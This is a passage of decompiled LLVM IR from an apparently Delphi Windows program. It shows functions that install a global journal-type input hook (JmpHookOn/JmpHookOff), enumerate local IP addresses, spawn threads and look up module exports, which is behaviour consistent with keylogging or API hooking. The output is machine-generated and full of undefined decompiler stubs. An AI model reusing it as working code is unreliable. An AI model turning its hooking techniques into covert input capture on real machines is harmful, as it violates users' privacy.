  %9 = add i8 %6, %8, !insn.addr !1812
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1812
  store i8 %9, i8* %10, align 1, !insn.addr !1812
  %11 = add i32 %2, 81, !insn.addr !1813
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1813
  %13 = load i8, i8* %12, align 1, !insn.addr !1813
  %14 = trunc i32 %1 to i8, !insn.addr !1813
  %15 = add i8 %13, %14, !insn.addr !1813
  store i8 %15, i8* %12, align 1, !insn.addr !1813
  %16 = load i32, i32* %eax, align 4, !insn.addr !1814
  ret i32 %16, !insn.addr !1814
}

define x86_fp80 @function_4071fb() local_unnamed_addr {
dec_label_pc_4071fb:
  %0 = call x86_fp80 @__decompiler_undefined_function_8()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1815
  ret x86_fp80 %1, !insn.addr !1816
}

define i32 @function_407200() local_unnamed_addr {
dec_label_pc_407200:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1817
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1818
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1818
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1818
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1819
  %3 = call i32 @function_407004(), !insn.addr !1820
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1821
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1822
  %6 = icmp eq i32 %5, 180, !insn.addr !1823
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1824
  br i1 %6, label %dec_label_pc_407263, label %dec_label_pc_40723e, !insn.addr !1824

dec_label_pc_40723e:                              ; preds = %dec_label_pc_407200
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1825
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1826
  %10 = icmp eq i1 %9, false, !insn.addr !1827
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1827
  br i1 %10, label %dec_label_pc_407263, label %dec_label_pc_40724a, !insn.addr !1827

dec_label_pc_40724a:                              ; preds = %dec_label_pc_40723e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1828
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_407263

dec_label_pc_407263:                              ; preds = %dec_label_pc_40724a, %dec_label_pc_407200, %dec_label_pc_40723e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1829
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1830
  %13 = add i32 %esp.1, 8, !insn.addr !1831
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1831
  store i32 4223622, i32* %14, align 4, !insn.addr !1831
  %15 = call i32 @"@LStrClr"(), !insn.addr !1832
  ret i32 %15, !insn.addr !1833
}

define i32 @function_40727f() local_unnamed_addr {
dec_label_pc_40727f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1834
  ret i32 %0, !insn.addr !1834
}

define i32 @function_407284() local_unnamed_addr {
dec_label_pc_407284:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1835
}

define i32 @function_407286(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407286:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1836
}

define i32 @function_40729c() local_unnamed_addr {
dec_label_pc_40729c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1837
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1837
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1837
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1838
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1839
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1839
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1840
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1841
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1842
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1843
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1843
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1844
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1845
  %16 = ashr i32 %15, 31, !insn.addr !1846
  %17 = zext i32 %15 to i64, !insn.addr !1847
  %18 = zext i32 %16 to i64, !insn.addr !1847
  %19 = mul i64 %18, 4294967296, !insn.addr !1847
  %20 = or i64 %19, %17, !insn.addr !1847
  %21 = zext i32 %4 to i64, !insn.addr !1847
  %22 = sdiv i64 %20, %21, !insn.addr !1847
  %23 = trunc i64 %22 to i32, !insn.addr !1847
  ret i32 %23, !insn.addr !1848
}

define i32 @function_4072f8() local_unnamed_addr {
dec_label_pc_4072f8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1849
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1850
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1850
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1850
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1851
  %2 = load i32*, i32** @global_var_408158, align 4, !insn.addr !1852
  %3 = icmp eq i32* %2, null, !insn.addr !1852
  br i1 %3, label %dec_label_pc_407334, label %dec_label_pc_407321, !insn.addr !1853

dec_label_pc_407321:                              ; preds = %dec_label_pc_4072f8
  store i32 0, i32* %2, align 4, !insn.addr !1854
  %4 = call i32 @function_4066c0(), !insn.addr !1855
  br label %dec_label_pc_407334, !insn.addr !1855

dec_label_pc_407334:                              ; preds = %dec_label_pc_407321, %dec_label_pc_4072f8
  %5 = load i32, i32* @global_var_408140, align 4, !insn.addr !1856
  %6 = icmp eq i32 %5, 0, !insn.addr !1856
  br i1 %6, label %dec_label_pc_407348, label %dec_label_pc_40733e, !insn.addr !1857

dec_label_pc_40733e:                              ; preds = %dec_label_pc_407334
  %7 = load i32*, i32** @global_var_408144, align 4, !insn.addr !1858
  %8 = icmp eq i32* %7, null, !insn.addr !1858
  %9 = icmp eq i1 %8, false, !insn.addr !1859
  br i1 %9, label %dec_label_pc_407352, label %dec_label_pc_407348, !insn.addr !1859

dec_label_pc_407348:                              ; preds = %dec_label_pc_40733e, %dec_label_pc_407334
  %10 = call i32 @function_40742c(), !insn.addr !1860
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1861
  br label %dec_label_pc_4073ef, !insn.addr !1861

dec_label_pc_407352:                              ; preds = %dec_label_pc_40733e
  %11 = load i8, i8* bitcast (i32** @global_var_408168 to i8*), align 4, !insn.addr !1862
  %12 = icmp eq i8 %11, 0, !insn.addr !1862
  br i1 %12, label %dec_label_pc_40737b, label %dec_label_pc_40735c, !insn.addr !1863

dec_label_pc_40735c:                              ; preds = %dec_label_pc_407352
  %13 = call i32 @function_406c14(), !insn.addr !1864
  %14 = icmp eq i32 %13, 0, !insn.addr !1865
  br i1 %14, label %dec_label_pc_40737b, label %dec_label_pc_407374, !insn.addr !1866

dec_label_pc_407374:                              ; preds = %dec_label_pc_40735c
  %15 = call i32 @function_40742c(), !insn.addr !1867
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1868
  br label %dec_label_pc_4073ef, !insn.addr !1868

dec_label_pc_40737b:                              ; preds = %dec_label_pc_40735c, %dec_label_pc_407352
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1869
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1870
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 3 to i32 (i32*)*), i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1871
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1872
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1873
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1873
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4216780 to i32*), i32 0, i32* null), !insn.addr !1874
  %23 = call i32 @function_40742c(), !insn.addr !1875
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1875
  br label %dec_label_pc_4073ef, !insn.addr !1875

dec_label_pc_4073ef:                              ; preds = %dec_label_pc_40737b, %dec_label_pc_407374, %dec_label_pc_407348
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1876
  %25 = load i32, i32* %24, align 4, !insn.addr !1876
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1877
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1878
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1878
  store i32 4224012, i32* %27, align 4, !insn.addr !1878
  %28 = call i32 @"@LStrClr"(), !insn.addr !1879
  ret i32 %28, !insn.addr !1880
}

define i32 @function_407405() local_unnamed_addr {
dec_label_pc_407405:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1881
  ret i32 %0, !insn.addr !1881
}

define i32 @function_40740a() local_unnamed_addr {
dec_label_pc_40740a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1882
}

define i32 @function_40740c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40740c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1883
}

define i32 @function_40742c() local_unnamed_addr {
dec_label_pc_40742c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1884
  %1 = call i32 @"@LStrClr"(), !insn.addr !1885
  ret i32 %1, !insn.addr !1886
}

define i32 @function_407444() local_unnamed_addr {
dec_label_pc_407444:
  %eax.0.reg2mem = alloca i32, !insn.addr !1887
  %esp.0.reg2mem = alloca i32, !insn.addr !1887
  %esp.15.reg2mem = alloca i32, !insn.addr !1887
  %storemerge6.reg2mem = alloca i32, !insn.addr !1887
  %.reg2mem = alloca i32, !insn.addr !1887
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1887
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1888
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1889
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1890
  %5 = call i32 @"@LStrClr"(), !insn.addr !1891
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1892
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1892
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1893
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1894
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1895
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1895
  %11 = icmp eq %hostent* %9, null, !insn.addr !1896
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1897
  br i1 %11, label %dec_label_pc_4074a2, label %dec_label_pc_40747c, !insn.addr !1897

dec_label_pc_40747c:                              ; preds = %dec_label_pc_407444
  %12 = add i32 %10, 12, !insn.addr !1898
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1898
  %14 = load i32, i32* %13, align 4, !insn.addr !1898
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1899
  %16 = load i32, i32* %15, align 4, !insn.addr !1899
  %17 = icmp eq i32 %16, 0, !insn.addr !1900
  %18 = icmp eq i1 %17, false, !insn.addr !1901
  br i1 %18, label %dec_label_pc_407483.lr.ph, label %dec_label_pc_40749d, !insn.addr !1901

dec_label_pc_407483.lr.ph:                        ; preds = %dec_label_pc_40747c
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1894
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_407483

dec_label_pc_407483:                              ; preds = %dec_label_pc_407483.lr.ph, %dec_label_pc_407495
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1902
  %21 = icmp eq i1 %20, false, !insn.addr !1903
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1903
  br i1 %21, label %dec_label_pc_407495, label %dec_label_pc_407487, !insn.addr !1903

dec_label_pc_407487:                              ; preds = %dec_label_pc_407483
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1904
  %23 = load i32, i32* %22, align 4, !insn.addr !1904
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1904
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1904
  store i32 %23, i32* %25, align 4, !insn.addr !1904
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1905
  %27 = call i32 @StrPas(), !insn.addr !1906
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1906
  br label %dec_label_pc_407495, !insn.addr !1906

dec_label_pc_407495:                              ; preds = %dec_label_pc_407487, %dec_label_pc_407483
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1907
  %29 = mul i32 %28, 4, !insn.addr !1899
  %30 = add i32 %29, %14, !insn.addr !1899
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1899
  %32 = load i32, i32* %31, align 4, !insn.addr !1899
  %33 = icmp eq i32 %32, 0, !insn.addr !1900
  %34 = icmp eq i1 %33, false, !insn.addr !1901
  store i32 %32, i32* %.reg2mem, !insn.addr !1901
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1901
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1901
  br i1 %34, label %dec_label_pc_407483, label %dec_label_pc_40749d, !insn.addr !1901

dec_label_pc_40749d:                              ; preds = %dec_label_pc_407495, %dec_label_pc_40747c
  %35 = call i32 @WSACleanup(), !insn.addr !1908
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1908
  br label %dec_label_pc_4074a2, !insn.addr !1908

dec_label_pc_4074a2:                              ; preds = %dec_label_pc_40749d, %dec_label_pc_407444
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1909
}

define i32 @function_4074b0() local_unnamed_addr {
dec_label_pc_4074b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1910
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1910
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1910
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1911
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1912
  %3 = add i32 %2, 1, !insn.addr !1912
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1912
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1913
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1914
  ret i32 0, !insn.addr !1915
}

define i32 @function_4074d5() local_unnamed_addr {
dec_label_pc_4074d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1916
  ret i32 %0, !insn.addr !1916
}

define i32 @function_4074da() local_unnamed_addr {
dec_label_pc_4074da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1917
}

define i32 @function_4074dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1918
}

define i32 @function_4074e0() local_unnamed_addr {
dec_label_pc_4074e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1919
  %2 = add i32 %1, -1, !insn.addr !1919
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1919
  ret i32 %0, !insn.addr !1920
}

define i32 @function_4074e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074e8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1921
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1921
  ret i32 %2, !insn.addr !1922
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407508:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224232 to i32*), i32 3), !insn.addr !1923
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1923
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1924
  %3 = icmp eq i32* %1, null, !insn.addr !1925
  %4 = icmp eq i1 %3, false, !insn.addr !1926
  %5 = sext i1 %4 to i32, !insn.addr !1927
  ret i32 %5, !insn.addr !1928
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407534:
  %0 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1929
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1930
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1930
  %3 = sext i1 %2 to i32, !insn.addr !1930
  ret i32 %3, !insn.addr !1931
}

define i32 @function_407540() local_unnamed_addr {
dec_label_pc_407540:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1932
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1932
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1932
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1933
  %2 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1934
  %3 = add i32 %2, 1, !insn.addr !1934
  store i32 %3, i32* @global_var_4096e8, align 4, !insn.addr !1934
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1935
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1936
  ret i32 0, !insn.addr !1937
}

define i32 @function_407565() local_unnamed_addr {
dec_label_pc_407565:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1938
  ret i32 %0, !insn.addr !1938
}

define i32 @function_40756a() local_unnamed_addr {
dec_label_pc_40756a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1939
}

define i32 @function_40756c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40756c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1940
}

define i32 @function_407570() local_unnamed_addr {
dec_label_pc_407570:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1941
  %2 = add i32 %1, -1, !insn.addr !1941
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1941
  ret i32 %0, !insn.addr !1942
}

define i32* @function_407578(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1943
  ret i32* %0, !insn.addr !1943
}

define i32 @function_407580() local_unnamed_addr {
dec_label_pc_407580:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1944
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1944
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1944
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1945
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !1946
  %3 = add i32 %2, 1, !insn.addr !1946
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !1946
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1947
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1948
  ret i32 0, !insn.addr !1949
}

define i32 @function_4075a5() local_unnamed_addr {
dec_label_pc_4075a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1950
  ret i32 %0, !insn.addr !1950
}

define i32 @function_4075aa() local_unnamed_addr {
dec_label_pc_4075aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1951
}

define i32 @function_4075ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1952
}

define i32 @function_4075b0() local_unnamed_addr {
dec_label_pc_4075b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !1953
  %2 = add i32 %1, -1, !insn.addr !1953
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !1953
  ret i32 %0, !insn.addr !1954
}

define i32 @function_407610(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407610:
  %esp.1.reg2mem = alloca i32, !insn.addr !1955
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1955
  %eax.0.reg2mem = alloca i32, !insn.addr !1955
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1956
  %7 = icmp eq i8 %6, 0, !insn.addr !1956
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1957
  br i1 %7, label %dec_label_pc_407623, label %dec_label_pc_40761b, !insn.addr !1957

dec_label_pc_40761b:                              ; preds = %dec_label_pc_407610
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1958
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1958
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1958
  br label %dec_label_pc_407623, !insn.addr !1958

dec_label_pc_407623:                              ; preds = %dec_label_pc_40761b, %dec_label_pc_407610
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1959
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1960
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1960
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1960
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1961
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1961
  store i32 %13, i32* %15, align 4, !insn.addr !1961
  %16 = icmp eq i32* %12, null, !insn.addr !1962
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1963
  br i1 %16, label %dec_label_pc_40767b, label %dec_label_pc_40763f, !insn.addr !1963

dec_label_pc_40763f:                              ; preds = %dec_label_pc_407623
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1964
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1965
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1965
  store i32 %17, i32* %19, align 4, !insn.addr !1965
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1966
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1967
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1967
  store i32 %20, i32* %22, align 4, !insn.addr !1967
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1968
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1968
  store i32 %arg3, i32* %24, align 4, !insn.addr !1968
  %25 = load i32, i32* %22, align 4, !insn.addr !1969
  %26 = add i32 %esp.0, -8, !insn.addr !1970
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1970
  store i32 %25, i32* %27, align 4, !insn.addr !1970
  %28 = add i32 %esp.0, -12, !insn.addr !1971
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1971
  store i32 %17, i32* %29, align 4, !insn.addr !1971
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1972
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1972
  %32 = add i32 %esp.0, -16, !insn.addr !1973
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1973
  store i32 %31, i32* %33, align 4, !insn.addr !1973
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1974
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1974
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1975
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1975
  store i32 %35, i32* %37, align 4, !insn.addr !1975
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1976
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1977
  br i1 %38, label %dec_label_pc_40767b, label %dec_label_pc_407667, !insn.addr !1977

dec_label_pc_407667:                              ; preds = %dec_label_pc_40763f
  %39 = load i32, i32* %24, align 4, !insn.addr !1978
  %40 = add i32 %esp.0, -20, !insn.addr !1979
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1979
  store i32 %39, i32* %41, align 4, !insn.addr !1979
  %42 = load i32, i32* %15, align 4, !insn.addr !1980
  %43 = add i32 %esp.0, -24, !insn.addr !1981
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1981
  store i32 %42, i32* %44, align 4, !insn.addr !1981
  %45 = call i32 @function_4076e4(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1982
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1982
  br label %dec_label_pc_40767b, !insn.addr !1982

dec_label_pc_40767b:                              ; preds = %dec_label_pc_407667, %dec_label_pc_40763f, %dec_label_pc_407623
  br i1 %7, label %dec_label_pc_407692, label %dec_label_pc_407683, !insn.addr !1983

dec_label_pc_407683:                              ; preds = %dec_label_pc_40767b
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !1984
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1985
  %48 = load i32, i32* %47, align 4, !insn.addr !1985
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !1985
  br label %dec_label_pc_407692, !insn.addr !1986

dec_label_pc_407692:                              ; preds = %dec_label_pc_407683, %dec_label_pc_40767b
  %49 = add i32 %eax.0.reload, 4, !insn.addr !1987
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1987
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1959
  ret i32 %eax.0.reload, !insn.addr !1988
}

define i32 @function_40769c() local_unnamed_addr {
dec_label_pc_40769c:
  %eax.1.reg2mem = alloca i32, !insn.addr !1989
  %eax.0.reg2mem = alloca i32, !insn.addr !1989
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !1990
  %4 = add i32 %3, 8, !insn.addr !1991
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1991
  %6 = load i32, i32* %5, align 4, !insn.addr !1991
  %7 = icmp eq i32 %6, 0, !insn.addr !1991
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1992
  br i1 %7, label %dec_label_pc_4076d6, label %dec_label_pc_4076ad, !insn.addr !1992

dec_label_pc_4076ad:                              ; preds = %dec_label_pc_40769c
  %8 = add i32 %3, 24, !insn.addr !1993
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1993
  %10 = load i32, i32* %9, align 4, !insn.addr !1993
  %11 = icmp eq i32 %10, 0, !insn.addr !1993
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1994
  br i1 %11, label %dec_label_pc_4076d6, label %dec_label_pc_4076b3, !insn.addr !1994

